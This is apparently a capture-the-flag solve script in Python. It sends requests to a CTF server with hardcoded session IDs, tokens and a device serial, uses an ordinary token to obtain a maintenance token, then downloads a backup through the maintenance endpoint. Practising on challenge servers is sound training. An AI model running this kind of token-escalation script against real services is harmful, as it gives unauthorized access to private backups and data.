import requests

base_url = 'http://pwn.osucyber.club:13372'

data = {
	'SESSIONID1': 'k4+MGFtz2rjHLNfMMReAobPIIYbL9G1qNguWUmDIvjQ=',
	'token': 'gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA',
	'serial': '60AKGPCIAX1AYIVN36M7MSIOXCRQ17ET2U17VUSS'
}

maintainence_data = {
	'SESSIONID1': 'k4+MGFtz2rjHLNfMMReAobPIIYbL9G1qNguWUmDIvjQ=',
	'token': 'Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw',
	'serial': '60AKGPCIAX1AYIVN36M7MSIOXCRQ17ET2U17VUSS'
}

# Generate token
def generate_token():
	r = requests.post(base_url + '/api/generate_token')
	print(r.text)

def get_status():
	r = requests.get(base_url + '/api/status', params=data)
	print(r.text)

# Generate maintainence token
def generate_maintainence_token():
	r = requests.post(base_url + '/api/generate_maintenance_token', data=data)
	print(r.text)

def download():
	r = requests.get(base_url + '/api/download_backup', params=maintainence_data)
	print(r.text)

#get_status()
#generate_maintainence_token()
download()